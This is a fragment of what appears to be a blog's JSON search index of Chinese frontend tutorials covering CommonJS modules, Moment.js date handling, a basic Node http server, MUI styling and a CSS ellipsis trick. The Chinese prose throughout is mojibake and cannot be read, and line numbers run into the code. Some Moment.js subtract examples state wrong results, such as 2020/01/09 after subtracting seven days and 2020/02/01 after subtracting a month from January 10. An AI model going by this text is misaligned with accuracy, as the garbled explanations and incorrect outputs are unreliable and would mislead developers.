æƒ³åƒè€ƒåŸå§‹ç¢¼çš„è©±å¯ä»¥åˆ°é€™é‚Šã€‚","link":"/2022/05/13/mobx-basic/"},{"title":"æ¨¡çµ„åŒ–çš„è¼¸å‡ºèˆ‡è¼¸å…¥","text":"å¸Œæœ›å¯ä»¥ææ‡‚å®ƒã€‚ ä¸‰å·¨é ­æ¨™æº– Asynchronous Module Definitionï¼ˆAMDï¼‰ éåŒæ­¥æ¨¡çµ„å®šç¾©ã€‚å¯ä»¥æƒ³æˆæ˜¯å¾ CommonJS å»¶ä¼¸å‡ºä¾†çš„å¦ä¸€å€‹æ¨™æº–ï¼Œç›®çš„æ˜¯æå‡ç€è¦½å™¨åœ¨è¼‰å…¥æ¨¡çµ„çš„æ•ˆèƒ½ã€‚ CommonJSï¼ˆCMJï¼‰ å°±æ˜¯ç­‰ä¸‹è¦ä»‹ç´¹çš„æ±è¥¿ï¼Œç‰¹åˆ¥æ³¨æ„é€™ç¨®æ¨¡çµ„æ˜¯ç”¨ åŒæ­¥ ä¾†è¼‰å…¥æ¨¡çµ„çš„ã€‚ ES6ï¼ˆESMï¼‰çš„ import èˆ‡ export ä¹‹å¾Œå‡ºä¾†çš„ä¸€å€‹æ–°æ¨™æº–ï¼Œå¯ä»¥åœ¨ Node.js è·Ÿç€è¦½å™¨ä¸Šè·‘ï¼Œè©³ç´°ä»‹ç´¹å¯ä»¥åƒè€ƒ ES6 çš„æ¨¡çµ„æ©Ÿåˆ¶ã€‚ æ³¨æ„äº‹é …é€™ç¯‡æ–‡ç« ä»‹ç´¹çš„æ¨¡çµ„æ©Ÿåˆ¶æ˜¯ã€ŒCommonJSã€çš„æ¨™æº–ï¼Œè€Œæ¡ç”¨é€™å¥—æ¨™æº–çš„åŸ·è¡Œç’°å¢ƒæ˜¯ã€ŒNode.jsã€ï¼Œä¸æ˜¯ç€è¦½å™¨ã€‚ä¹Ÿå°±æ˜¯èªª ä½ æ²’è¾¦æ³•åœ¨ç€è¦½å™¨ä¸Šç”¨é€™å¥—æ¨™æº–ã€‚ å¦‚æœä½ æ›¾ç¶“çœ‹éæœ‰äº›ç€è¦½å™¨ä¸Šå¯ä»¥ç”¨ï¼Œé‚£ä¹Ÿè¨±æ˜¯çœŸçš„ã€‚ä¸éæ­£ç¢ºä¸€é»çš„èªªæ³•æ˜¯ã€Œç”¨äº†æŸäº›å·¥å…·è®“ç€è¦½å™¨å¯ä»¥æ”¯æ´ã€æ‰å°ï¼Œæ‰€ä»¥è«‹ä¸è¦èª¤æœƒäº†ã€‚ è¼¸å‡ºä¸€å€‹ module çµ¦åˆ¥äººå‡è¨­æˆ‘æƒ³å¯«ä¸€å€‹ module çµ¦åˆ¥äººç”¨ï¼Œé‚£æˆ‘å¯ä»¥é€™æ¨£å¯«ï¼š 12345// myModule.jsfunction double(n) { return n * 2}module.exports = double module.exports å°±æ˜¯ç”¨ä¾†ã€ŒæŠŠä½ æƒ³è¼¸å‡ºçš„å…§å®¹ã€çµ¦è¼¸å‡ºã€‚ åœ¨ä¸Šé¢çš„ä¾‹å­è£¡æˆ‘è¼¸å‡ºäº†ä¸€å€‹ functionï¼Œä½†å…¶å¯¦ä¹Ÿå¯ä»¥æ”¹æˆ 123 æˆ– 'Hello' æˆ–æ˜¯ {name: 'PeaNu'} ç­‰ç­‰ï¼Œåªè¦æ˜¯ç¬¦åˆ JavaScript ä¸­çš„è³‡æ–™å‹æ…‹éƒ½å¯ä»¥ã€‚ è¼‰å…¥å¯«å¥½çš„ moduleå‰›å‰›å·²ç¶“å¯«å¥½ module çš„éƒ¨åˆ†äº†ï¼Œæ¥è‘—æˆ‘å€‘è¦ä¾†è¼‰å…¥ï¼š 123// main.jsvar myModule = require('./myModule')console.log(myModule) // [Function: double] require å°±æ˜¯ç”¨ä¾†ã€ŒæŠŠä½ æƒ³è¼¸å…¥çš„å…§å®¹ã€çµ¦è¼¸å…¥ã€‚ è¨˜å¾—è¦æŒ‡å®šä¸€å€‹è®Šæ•¸ä¾†å„²å­˜å¼•å…¥çš„æ¨¡çµ„ï¼Œæ¥è‘—é€™å€‹è®Šæ•¸å°±ç­‰åŒæ–¼å‰›å‰›å¯«å¥½çš„æ¨¡çµ„ã€‚ æ‰€ä»¥æŠŠ myModule å°å‡ºä¾†çœ‹å°±æœƒå¾—åˆ°å‰›å‰›å¯«å¥½çš„ functionï¼š double å¦‚æœåˆ°é€™è£¡éƒ½æ²’å•é¡Œçš„è©±ï¼Œå°±å¯ä»¥ä½¿ç”¨æ¨¡çµ„äº†ï¼š 12var myModule = require('./myModule')console.log(myModule(100)) // 200 å¦å¤–ä¸€ç¨®è¼¸å‡ºæ–¹å¼exports æ˜¯å¦å¤–ä¸€ç¨®è¼¸å‡ºæ–¹å¼ï¼Œè·Ÿ module.exports ä¸åŒçš„åœ°æ–¹æ˜¯ã€Œåªèƒ½ä»¥ç‰©ä»¶æ ¼å¼è¼¸å‡ºã€ï¼š 12345// myModule.jsfunction double(n) { return n * 2}exports.double = double æ‰€ä»¥å¼•å…¥çš„æ™‚å€™ï¼Œåªæœƒæ‹¿åˆ°ä¸€å€‹ç‰©ä»¶ï¼š 12var myModule = require('./myModule')console.log(myModule) // { double: [Function: double] } ç°¡å–®ä¾†èªªï¼Œä½ å¯ä»¥æŠŠ exports æƒ³æˆæ˜¯é€™æ¨£ï¼š 12345{ double: function double(n) { return n * 2 }} å®ƒä¸åƒ module.exports é‚£éº¼æœ‰å½ˆæ€§ï¼Œæƒ³è¼¸å‡ºä»€éº¼å°±è¼¸å‡ºä»€éº¼ï¼Œæ‰€ä»¥é€™å€‹å¯èƒ½æ¯”è¼ƒå°‘ç”¨ä¸€é»ã€‚ è¼¸å‡ºå¤šå€‹å…§å®¹å‰›å‰›åªæœ‰è¼¸å‡ºä¸€å€‹ functionï¼Œç¾åœ¨ä¾†å¤šè¼¸å‡ºå¹¾å€‹ã€‚ module.exports 12345678910function double(n) { return n * 2}function triple(n) { return n * 3}module.exports = { double: double, triple: triple} 1234var myModule = require('./myModule')console.log(myModule) // { double: [Function: double], triple: [Function: triple] }console.log(myModule.double(2)) // 4console.log(myModule.triple(2)) // 6 exports 12345678function double(n) { return n * 2}function triple(n) { return n * 3}exports.double = doubleexports.triple = triple 1234var myModule = require('./myModule')console.log(myModule) // { double: [Function: double], triple: [Function: triple] }console.log(myModule.double(2)) // 4console.log(myModule.triple(2)) // 6 ç‚ºä»€éº¼è¦æœ‰æ¨¡çµ„ï¼Ÿæ—¢ç„¶å·²ç¶“æœƒä½¿ç”¨äº†ï¼Œé‚£å°±è¦ä¾†è«‡è«‡ç‚ºä»€éº¼è¦ç”¨å®ƒï¼Ÿ å…¶å¯¦æ›å€‹è§’åº¦æƒ³å°±å¥½äº†ï¼Œå¦‚æœæ²’æœ‰æ¨¡çµ„çš„è©±æœƒæ€éº¼æ¨£ï¼Ÿ èˆ‰å€‹ä¾‹å­ï¼Œå‡è¨­æˆ‘æœ‰å…©å€‹æª”æ¡ˆï¼Œåˆ†åˆ¥æ˜¯ login.js è·Ÿ form.jsã€‚é€™å…©å€‹æª”æ¡ˆéƒ½æƒ³ç”¨ä¸€å€‹ function ä¾†åšã€Œä¿¡ç®±é©—è­‰ã€çš„å‹•ä½œã€‚åœ¨æ²’æœ‰æ¨¡çµ„çš„æƒ…æ³ä¸‹åªèƒ½é€™æ¨£å­åšï¼š 12345// login.jsfunction validEmail() { ...}validEmail(...) 12345// form.jsfunction validEmail() { ...}validEmail(...) ä½ æ‡‰è©²èƒ½ç™¼ç¾å•é¡Œå¾ˆæ˜é¡¯ï¼š æœ‰å¹¾å€‹æª”æ¡ˆè¦ç”¨ï¼Œå°±è¦å®£å‘Šå¹¾å€‹ validEmail å¦‚æœè¦ä¿®æ”¹ validEmailï¼Œé‚£æ¯ä¸€å€‹æª”æ¡ˆéƒ½å¾—é–‹èµ·ä¾†ä¸€å€‹ä¸€å€‹æ”¹ ä½†å¦‚æœæ˜¯æ¨¡çµ„åŒ–ï¼Œå°±åªæœƒæœ‰å…©å€‹å‹•ä½œï¼š æˆ‘è¦ç”¨ validEmailï¼Œå°±ç”¨ä¸€å€‹è®Šæ•¸ä¾†å„²å­˜ require å¼•å…¥é€²ä¾†çš„æ±è¥¿ å¦‚æœè¦ä¿®æ”¹ validEmailï¼Œæˆ‘åªè¦å»é€™å€‹æ¨¡çµ„çš„æª”æ¡ˆä¿®æ”¹å°±å¥½ åŸºæ–¼é€™å…©é»ï¼Œå…¶å¯¦å°±æ²’æœ‰ä¸ä½¿ç”¨æ¨¡çµ„åŒ–çš„ç†ç”±ã€‚","link":"/2021/12/23/module/"},{"title":"Moment.js ç­†è¨˜","text":"æŠŠä¸€äº›å¸¸ç”¨åˆ°çš„æ“ä½œçµ¦è¨˜éŒ„ä¸‹ä¾†ã€‚ ç°¡è¿°åº•ä¸‹ä»‹ç´¹çš„æ‰€æœ‰ç¯„ä¾‹å¯ä»¥åˆ° Codepen ä¸Šåƒè€ƒã€‚ addï¼ˆåŠ æ™‚é–“ï¼‰å°é™·é˜±ï¼šæ³¨æ„é€™æ˜¯ç”¨ mutable çš„æ–¹å¼ä¾†æ”¹è³‡æ–™ï¼Œæ‰€ä»¥è«‹é¿å…ç›´æ¥å°å„²å­˜ moment çš„ state ä½¿ç”¨ 12345678let A = moment('2020-01-01')let B = moment('2020-01-01')let C = moment('2020-01-01')console.log(A.add(1, 'days').format('YYYY/MM/DD')) // 2020/01/02console.log(A.format('YYYY/MM/DD')) // 2020/01/02 (mutable changed)console.log(B.add(1, 'months').format('YYYY/MM/DD')) // 2020/02/01console.log(C.format('LTS')) // 12:00:00 AMconsole.log(C.add(5, 'hours').format('LTS')) // 5:00:00 AM subtractï¼ˆæ¸›æ™‚é–“ï¼‰å°é™·é˜±ï¼šæ³¨æ„é€™æ˜¯ç”¨ mutable çš„æ–¹å¼ä¾†æ”¹è³‡æ–™ï¼Œæ‰€ä»¥è«‹é¿å…ç›´æ¥å°å„²å­˜ moment çš„ state ä½¿ç”¨ 12345678let A = moment('2020-01-10')let B = moment('2020-01-10')let C = moment('2020-01-10')console.log(A.subtract(7, 'days').format('YYYY/MM/DD')) // 2020/01/03console.log(A.format('YYYY/MM/DD')) // 2020/01/09 (mutable changed)console.log(B.subtract(1, 'months').format('YYYY/MM/DD')) // 2020/02/01console.log(C.format('LTS')) // 12:00:00 AMconsole.log(C.subtract(5, 'hours').format('LTS')) // 7:00:00 PM diffï¼ˆæ¯”è¼ƒå¤©æ•¸ï¼‰1234let A = moment('2020-01-01')let B = moment('2020-01-02')console.log(A.diff(B, 'days')) // -1console.log(B.diff(A, 'days')) // 1 endOf / startOf123let A = moment('2020-01-01')console.log(A.endOf('day').format('LTS')) // 11:59:59 PMconsole.log(A.startOf('day').format('LTS')) // 12:00:00 AM ç¢ºèªæ ¼å¼æ˜¯å¦æ­£ç¢ºå‡è¨­è¦ç¢ºèªæ ¼å¼æ˜¯å¦ç‚º 13/09/2022(DD/MM/YYYY)ï¼š 1234moment('13/09/2022', 'DD/MM/YYYY', true).isValid() // truemoment('01/13/2022', 'DD/MM/YYYY', true).isValid() // falsemoment('123', 'DD/MM/YYYY', true).isValid() // falsemoment('abc', 'DD/MM/YYYY', true).isValid() // false å¯¦éš›ä¾‹å­ï¼ˆAntdï¼‰StartDate &gt;= EndDateï¼š 123456const selectedEndDate = moment('2022-09-02')&lt;DatePicker disabledDate={(currentDate: moment.Moment) =&gt; currentDate.startOf('day').diff(selectedEndDate.startOf('day'), 'days') &gt; 0}/&gt; EndDate &lt;= StartDateï¼š 123456const selectedStartDate = moment('2022-09-02')&lt;DatePicker disabledDate={(currentDate: moment.Moment) =&gt; currentDate.startOf('day').diff(selectedStartDate.startOf('day'), 'days') &lt; 0}/&gt; é€™é‚Šå»ºè­°æ¯”è¼ƒæ™‚**æœ€å¥½æŠŠ A è·Ÿ B éƒ½åŠ ä¸Š startOf('day')**ï¼Œç¢ºä¿å…©è€…çš„æ™‚é–“ï¼ˆæ™‚/åˆ†/ç§’ï¼‰æ˜¯åˆ†ç§’ä¸å·®çš„ï¼Œå¦å‰‡æœ‰å¯èƒ½æœƒå‡ºç¾å°‘ä¸€å¤© or å¤šä¸€å¤©çš„å•é¡Œã€‚","link":"/2022/09/25/moment-js/"},{"title":"å»ºç«‹ä¸€å€‹æœ€åŸºæœ¬çš„ http-server","text":"æ²’æœ‰é‚£éº¼è¤‡é›œã€‚ åŸå§‹ç¢¼å‚™è¨»ï¼šres.end() çš„æ„æ€ä¸æ˜¯çµæŸã€‚æ˜¯é€å‡º response çš„æ„æ€ã€‚ 1234567891011121314151617181920212223242526272829// å¼•å…¥ http æ¨¡çµ„const http = require('http')// ä¼ºæœå™¨çš„ç›¸é—œè¨­å®šconst server = http.createServer((req, res) =&gt; { // ç•¶å­˜å– '/' æ™‚ï¼Œå›å‚³ welcome if(req.url === '/') { res.write('Welcome') res.end() return } // ç•¶å­˜å– '/hello' æ™‚ï¼Œå›å‚³ hello if(req.url === '/hello') { res.write('hello') res.end() return } // ç•¶å­˜å– '/redirect' æ™‚ï¼Œå›å‚³ 302 ç‹€æ…‹ç¢¼ï¼Œä»¥åŠè¦å°å‘çš„ç¶²å€ if(req.url === '/redirect') { res.writeHead(302, { 'Location': 'https://google.com/' }) res.end() return } // ç•¶å­˜å–ä¸å­˜åœ¨çš„è³‡æº æ™‚ï¼Œå›å‚³ 404 ç‹€æ…‹ç¢¼ res.writeHead(404) res.end()})server.listen(5000) // æä¾› xxx æœå‹™çš„æ„æ€ï¼ˆNBA å³æ™‚è³½æ³ï¼‰","link":"/2022/01/04/most-basic-http-server/"},{"title":"MUI ç­†è¨˜","text":"éå¸¸å¥½ç”¨ã€‚ åŸºç¤æ‡‰ç”¨é€™é‚Šæ˜¯æ¯”è¼ƒå CSS çš„æ‡‰ç”¨ï¼Œæ¨è–¦å¯ä»¥æŠŠå®˜æ–¹æ–‡ä»¶çš„ system éƒ¨åˆ†çµ¦çœ‹å®Œï¼Œé€™é‚Šåªæœƒåˆ—å¹¾å€‹æˆ‘æƒ³ç‰¹åˆ¥è¨˜ä¸€ä¸‹çš„ã€‚ sx å±¬æ€§é€™æ‡‰è©²æ˜¯ MUI è£¡é¢æœ€é‡è¦çš„ä¸€å€‹æ±è¥¿ã€‚ ç°¡å–®ä¾†èªªåªè¦æ˜¯ MUI çš„çµ„ä»¶éƒ½å¯ä»¥ç”¨ sm é€™å€‹ propsï¼Œä»–åŸºæœ¬ä¸Šå°±è·Ÿ style çš„ç”¨é€”å·®ä¸å¤šï¼Œä½†é‡é»æœ‰å…©å€‹ï¼š ä»–ä¸æ˜¯ inline-styleï¼ˆçµ•å°åˆ¥æéŒ¯å›‰ï¼‰ å¯ä»¥ç”¨ MUI å°ˆå±¬çš„ utils ä¾†å¯«æ¨£å¼ï¼ˆç•¶ tailwind åœ¨å¯« XDï¼‰ æ‰€ä»¥å¦‚æœæƒ³ç•«ä¸€å€‹ç°¡å–®çš„æ–¹å¡Š æˆ‘å¯ä»¥é€™æ¨£å¯«ï¼š 1234567891011121314151617181920export default function Color() { return ( &lt;div&gt; &lt;Box sx={{ width: 1 / 2, // 50% color: 'white', textAlign: 'center', fontWeight: 'bold', background: 'dodgerblue', borderRadius: '4px', py: 1, // 1 = 8px px: 2 // 2 = 16px }} &gt; Box1 &lt;/Box&gt; &lt;/div&gt; )} å› ç‚º sx å¾ˆå¥½ç”¨çš„é—œä¿‚ï¼Œæ‰€ä»¥ç•¶ä½ ç”¨äº† MUI ä»¥å¾Œé€šå¸¸æœƒç›´æ¥æ‹¿ &lt;Box&gt; ä¾†å–ä»£ &lt;div&gt;ã€‚ SpacingMUI é è¨­çš„é–“è·æ˜¯ 8pxï¼Œæ‰€ä»¥åªè¦è·Ÿé–“è·æœ‰é—œçš„è¨­å®šéƒ½æœƒæ‹¿ 8px ä¾†ç•¶ä½œåŸºæº–ï¼Œåƒæ˜¯å¸¸è¦‹çš„ margin è·Ÿ bottom å°±æœƒé€™æ¨£å¯«ï¼š 123456789101112131415161718192021export default function Spacing() { const boxStyle = (bg) =&gt; ({ width: 1 / 2, color: 'white', textAlign: 'center', fontWeight: 'bold', background: bg, borderRadius: '4px', py: 1, // 1 = 8px px: 2, // 2 = 16px mt: 2, // 16px ml: 4 }) return ( &lt;div style={{ margin: 50 }}&gt; &lt;Box sx={boxStyle('dodgerblue')}&gt;Box1&lt;/Box&gt; &lt;Box sx={boxStyle('cadetblue')}&gt;Box1&lt;/Box&gt; &lt;/div&gt; )} Shadowé€™å€‹æ˜¯æ‡¶çš„æ™‚å€™å¾ˆå¥½ç”¨ï¼ˆé›–ç„¶ç§å¿ƒè¦ºå¾— Tailwind çš„ shadow å¯«å¾—æ›´è‡ªç„¶ä¸€äº›ï¼‰ 1234567891011121314151617181920export default function Shadow() { const boxStyle = { width: 1 / 2, color: '#555', textAlign: 'center', background: 'white', borderRadius: '4px', boxShadow: 1, // shadow py: 1, px: 2, m: 4 } return ( &lt;div style={{ margin: 50 }}&gt; &lt;Box sx={boxStyle}&gt;Box1&lt;/Box&gt; &lt;Box sx={boxStyle}&gt;Box1&lt;/Box&gt; &lt;/div&gt; )} breakpointé€é sx è¨­å®šçš„æ¨£å¼éƒ½å¯ä»¥åœ¨æŒ‡å®šã€Œåœ¨å“ªå€‹ breakpoint ä¸‹å¥—ç”¨ã€çš„è¦å‰‡ï¼Œåƒé€™æ¨£ï¼š 12345678910111213141516171819202122export default function BreakPoint() { const boxStyle = { width: { xs: 1, // minWidth &gt; 0px sm: 1 / 2 // minWidth &gt; 600px }, color: 'white', background: 'dodgerblue', textAlign: 'center', borderRadius: '4px', py: 1, px: 2, mt: 2 } return ( &lt;div&gt; &lt;Box sx={boxStyle}&gt;Box1&lt;/Box&gt; &lt;Box sx={boxStyle}&gt;Box1&lt;/Box&gt; &lt;/div&gt; )} é è¨­çš„æ–·é»æ˜¯ï¼š xs: 0px sm: 600px md: 900px lg: 1200px xl: 1536px é€™å€‹åš RWD å¿…å‚™ï¼Œæ‰€ä»¥è¨˜å¾—å­¸èµ·ä¾†ã€‚ä¸æ‡‚çš„è©±å¯ä»¥åˆ°é€™é‚Š ç¯„ä¾‹ ä¾†çœ‹ï¼Œæˆ‘å°±ä¸è²¼åœ–äº†ã€‚ displayé€™å€‹å°±æ˜¯ç”¨ä¾†è¨­å®š blockã€inline-block ç­‰ç­‰ä¹‹é¡çš„æ±è¥¿ï¼Œè·Ÿ style çš„å¯«æ³•å¤§åŒå°ç•°ï¼Œæ‰€ä»¥é€™é‚Šæƒ³ç‰¹åˆ¥è¬›çš„æ˜¯ textOverflow çš„ç”¨æ³•ï¼Œåªè¦æ­é… &lt;Box&gt; ä¾†ç”¨å°±èƒ½å¾ˆè¼•é¬†çš„åšå‡º â€¦ çš„æ•ˆæœï¼š 123456789101112131415161718192021222324export default function TextOverflow() { const boxStyle = { width: 1, color: 'white', background: 'dodgerblue', overflow: 'hidden', // required whiteSpace: 'nowrap', // required textAlign: 'center', borderRadius: '4px', textOverflow: 'ellipsis', // required py: 1, // 1 = 8px px: 2, // 2 = 16px mt: 2 } return ( &lt;div&gt; &lt;Box sx={boxStyle}&gt; Lorem Ipsum is simply dummy text Lorem Ipsum is simply dummy text Lorem Ipsum is simply dummy text &lt;/Box&gt; &lt;/div&gt; )} ä¸æ‡‚çš„è©±ä¸€æ¨£èƒ½èƒ½åƒè€ƒæˆ‘å¯«çš„ç¯„ä¾‹ã€‚ Paletteï¼ˆèª¿è‰²ç›¤ï¼‰ç°¡å–®ä¾†èªªåƒ color è·Ÿ bgcolor é€™å…©å€‹æ±è¥¿å¯ä»¥ç›´æ¥ç”¨æŒ‡å®šçš„å­—ä¸²ä¾†å­˜å– MUI çš„åŸºæœ¬é…è‰²ï¼Œåƒé€™æ¨£ï¼š å¯«æ³•ä¹Ÿå¾ˆç°¡å–®ï¼š 1234567891011121314151617181920212223export default function Color(bg) { const boxStyle = (bg) =&gt; ({ width: 1, color: 'white', bgcolor: bg, overflow: 'hidden', whiteSpace: 'nowrap', textAlign: 'center', borderRadius: '4px', textOverflow: 'ellipsis', py: 2, mt: 2 }) return ( &lt;div&gt; &lt;Box sx={boxStyle('primary.main')}&gt;primary&lt;/Box&gt; &lt;Box sx={boxStyle('secondary.main')}&gt;secondary&lt;/Box&gt; &lt;Box sx={boxStyle('success.main')}&gt;success&lt;/Box&gt; &lt;Box sx={boxStyle('warning.main')}&gt;warning&lt;/Box&gt; &lt;/div&gt; )} ç¯„ä¾‹åˆ° é€™é‚Š çœ‹ã€‚è‡³æ–¼å­—é«”é¡è‰²çš„ç”¨æ³•ä¹Ÿå·®ä¸å¤šï¼Œæƒ³çŸ¥é“æ›´å¤šçš„è©±çœ‹ å®˜æ–¹æ–‡ä»¶ æ¯”è¼ƒå¿«ã€‚ TextFieldé€™å€‹å¯«è¡¨å–®çš„æ™‚å€™æœƒè »å¸¸ç”¨åˆ°çš„ï¼Œé€™é‚Šæƒ³ç‰¹åˆ¥è¨˜çš„å¹¾å€‹ props æœ‰å¹¾å€‹ï¼š required helperText Error InputProps (ReadOnly) multiline æ¼”ç¤ºçš„éƒ¨åˆ†å¯ä»¥åƒè€ƒé€™è£¡ã€‚ ThemeProvideræƒ³åƒè€ƒé è¨­å€¼çš„è©±å¯ä»¥åˆ° å®˜æ–¹æ–‡ä»¶ çœ‹ã€‚ å¦‚æœä½ æƒ³è¦è¦†è“‹ MUI é è¨­çš„ä¸€äº›æ¨£å¼ï¼Œåƒæ˜¯ã€Œé¡è‰²ã€ã€ã€Œé–“è·ã€ã€ã€Œå­—é«”ã€å’Œã€Œé™°å½±ã€ä¹‹é¡çš„è¨­å®šçš„è©±ï¼Œå¯ä»¥ç”¨ ThemeProvider çš„æ–¹å¼ä¾†è¦†å¯«ã€‚ ä¾†çœ‹ä¸€å€‹æœ€ç°¡å–®çš„ä¾‹å­ï¼Œå‡è¨­æˆ‘æƒ³æŠŠ primary è‰²æ”¹æ‰ï¼Œé‚£æˆ‘å¯ä»¥é€™æ¨£å¯«ï¼š 123456789101112131415161718import { createTheme, ThemeProvider } from '@mui/material/styles'const theme = createTheme({ palette: { primary: { main: '#8d69f1' } }})ReactDOM.render( &lt;React.StrictMode&gt; &lt;ThemeProvider theme={theme}&gt; &lt;App /&gt; &lt;/ThemeProvider&gt; &lt;/React.StrictMode&gt;, document.getElementById('root')) ä»–èƒŒå¾Œæ˜¯ç”¨ Context ä¾†å¯¦ä½œçš„ï¼Œæ‰€ä»¥é€™ä¾‹å­çš„åº•ä¸‹æ‰€æœ‰ç”¨åˆ° primary è‰²çš„çµ„ä»¶éƒ½æœƒè®Šæˆæˆ‘å¯«çš„é¡è‰²ã€‚ å¦‚æœæˆ‘ä¸æƒ³è¦ä»–çš„ scope é‚£éº¼å¤§ï¼Œé‚£å°±æŠŠ ThemeProvider æ”¾åœ¨å°æ‡‰çš„çµ„ä»¶ä¸Šå°±å¥½ï¼Œåƒé€™æ¨£ï¼š 12345678910export default function BasicButtons() { return ( &lt;Stack spacing={2} direction='row'&gt; &lt;ThemeProvider theme={theme}&gt; &lt;Button variant='contained'&gt;Contained&lt;/Button&gt; &lt;/ThemeProvider&gt; &lt;Button variant='contained'&gt;Contained&lt;/Button&gt; &lt;/Stack&gt; )} useTheme çš„ç”¨æ³•æœ‰æ™‚å€™ä½ å¯èƒ½æƒ³å¯«ä¸€äº› inline-styleï¼Œä½†ä½ æƒ³ç›´æ¥æ‹¿ MUI å¯«å¥½çš„æ¨£å¼ä¾†ç”¨ï¼Œé€™æ™‚å€™ä½ å°±å¯ä»¥ç”¨ useTheme ä¾†æŠŠå°æ‡‰çš„å€¼å–å‡ºä¾†ã€‚ ä¾‹å¦‚æ ¹æ“šä¸åŒé•·åº¦çš„æ–‡å­—æˆ‘æƒ³å¥—ç”¨ä¸åŒçš„é¡è‰²ï¼š 123456789101112131415161718192021222324252627import { useTheme } from '@mui/material/styles'import { Typography } from '@mui/material'export default function BasicButtons() { // é€éä»–æˆ‘å°±èƒ½å­˜å–æ‰€æœ‰ MUI çš„æ¨£å¼è¨­å®š const theme = useTheme() const title1 = 'short Text' const title2 = 'I an long short Text' const getTypeStyle = (text, theme) =&gt; { return { color: text.length &lt; 15 ? theme.palette.primary.main : theme.palette.secondary.main } } // spacing(1) = 8px return ( &lt;div style={{ margin: theme.spacing(4) }}&gt; &lt;Typography style={getTypeStyle(title1, theme)} variant='h6' component='div' gutterBottom&gt; {title1} &lt;/Typography&gt; &lt;Typography style={getTypeStyle(title2, theme)} variant='h6' component='div' gutterBottom&gt; {title2} &lt;/Typography&gt; &lt;/div&gt; )} å¯ä»¥ç›´æ¥ç•¶ä½œ utility ä¾†ç”¨ï¼Œæˆ‘è¦ºå¾—é‚„è »æ–¹ä¾¿çš„ã€‚ é—œæ–¼ Selectbox çš„ä¸€å€‹å°é›·é»é€™é‚Šåªæ˜¯è¨˜éŒ„ä¸€ä¸‹ç•¶åˆè¦ºå¾—å¾ˆé›·çš„ bugã€‚ æˆ‘åŸæœ¬é æœŸçµæœæ˜¯é€™æ¨£å­ï¼š ä½†å‡ºä¾†çš„çµæœæ˜¯é€™æ¨£å­ï¼š å°±æ˜¯ label çš„éƒ¨åˆ†ç¸½æœƒè¶…å‡º border çš„ç·šæ¢ï¼Œç•¶åˆæ‰¾äº†è »ä¹…æ‰æ‰¾åˆ°è§£æ³•ã€‚ ç°¡å–®ä¾†èªª border æœƒéš¨è‘— &lt;Select&gt; çš„ label ä¾†åšèª¿æ•´ï¼Œæ‰€ä»¥ä½ ä¸€å®šè¦è®“å®ƒçš„å€¼è·Ÿé¡¯ç¤ºçš„ &lt;InputLabel&gt; çš„å…§å®¹æ˜¯ä¸€æ¨£çš„ï¼š 123456789101112131415161718192021222324&lt;FormControl&gt; &lt;InputLabel&gt;Project Detail&lt;/InputLabel&gt; &lt;Select label='Project Detail' // é€™å€‹è¦è·Ÿä¸Šé¢çš„ &lt;InputLabel&gt; å°æ‡‰ multiple value={personName} onChange={(e) =&gt; setPersonName(e.target.value)} renderValue={(selected) =&gt; { return ( &lt;Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 1 }}&gt; {selected.map((value) =&gt; ( &lt;Chip variant='outlined' key={value} label={value} /&gt; ))} &lt;/Box&gt; ) }} &gt; {names.map((name) =&gt; ( &lt;MenuItem key={name} value={name}&gt; {name} &lt;/MenuItem&gt; ))} &lt;/Select&gt;&lt;/FormControl&gt; å®¢è£½åŒ– CSSsx å±¬æ€§é€™æ˜¯æœ€ç°¡å–®ä¹Ÿæ˜¯æœ€æ¨è–¦çš„ä½œæ³•ï¼Œå°±æ˜¯ç”¨ sx å±¬æ€§ä¾†æ”¹ï¼š 1234567891011export default function SxProp() { return ( &lt;Slider defaultValue={30} sx={{ width: 300, color: 'success.main' }} /&gt; )} å¯ä»¥çœ‹åˆ°é€™é‚Šå¯«çš„æ¨£å¼æœƒå‡ºç¾åœ¨ .css-121j95d-MuiSlider-root ä¸­ã€‚å¦‚æœè¦ç”¨ç´” CSS ä¾†åšçš„è©±å°±ç„¡æ³•äº†ï¼Œå› ç‚º class ä¸­æœ‰ hash å€¼ã€‚ åœ¨ sx ä¸­ä½¿ç”¨ selectorä¸€å€‹å…ƒä»¶é€šå¸¸æ˜¯ç”±å¤šå€‹ part ä¾†çµ„æˆçš„ï¼Œåƒä¸Šé¢çš„ Slider ä¸­å°±åŒ…å«äº† railã€track å’Œ thumb é€™å¹¾å€‹éƒ¨ä½ï¼š é€™é‚Šé †ä¾¿ä»‹ç´¹ä¸€ä¸‹ MUI çš„å‘½åè¦å‰‡æ˜¯ [hash]-Mui[å…ƒä»¶åç¨±]-[å…ƒä»¶ä¸­çš„å…¶ä»–æ’æ§½] ä½ å¯èƒ½æœƒæƒ³èªªæœ‰ hash å€¼çš„è©±è¦æ€éº¼å¯«ï¼Ÿä¸éä¸ç”¨æ“”å¿ƒï¼Œé€é sx ä½ åªéœ€è¦å¯«æˆ &amp; .MuiSlider-[æ’æ§½åç¨±] å°±å¯ä»¥äº†ï¼Œä¸ç”¨æ“”å¿ƒ hash å€¼ï¼š 123456789101112131415export default function SxProp() { return ( &lt;Slider defaultValue={30} sx={{ width: 300, color: 'success.main', // æŠŠæŒ‰éˆ•çš„éƒ¨åˆ†æ”¹æˆæ–¹å½¢ '&amp; .MuiSlider-thumb': { borderRadius: 1 } }} /&gt; )} æ‰€ä»¥ç•¶ä½ ç¢°åˆ°ã€Œè¦æ”¹çš„éƒ¨åˆ†æ˜¯å…ƒä»¶çš„æ’æ§½ã€æ™‚ï¼Œå°±ç”¨é€™ç¨®æ–¹å¼ä¾†ä¿®æ”¹å°±è¡Œäº†ã€‚","link":"/2022/07/11/mui-basic/"},{"title":"CSS å¤šè¡Œæ–‡å­—é¡¯ç¤º ... çš„æ•ˆæœ","text":"åŸä¾†é‚„æœ‰é€™ç¨®ç›’å­ã€‚ ç°¡è¿°ä¸€èˆ¬è¦ç”¨ CSS åšå‡ºã€Œæ–‡å­—â€¦ã€çš„æ•ˆæœåªé©ç”¨æ–¼å–®è¡Œæ–‡å­—ï¼Œä½œæ³•å¯ä»¥åƒè€ƒæˆ‘ä»¥å‰å¯«çš„ CSS è®“æ–‡å­—æœ‰ â€¦ çš„æ•ˆæœã€‚ ä»Šå¤©æˆ‘ç™¼ç¾äº†ä¸€å€‹æ–°çš„æ–¹æ³•ï¼Œå®ƒä¸éœ€è¦ JavaScriptï¼Œåªè¦ CSS å°±å¯ä»¥é”æˆã€‚ æ–°çš„ç›’å­é€™é‚Šè¦ç”¨ä¸€å€‹å«åš -webkit-box 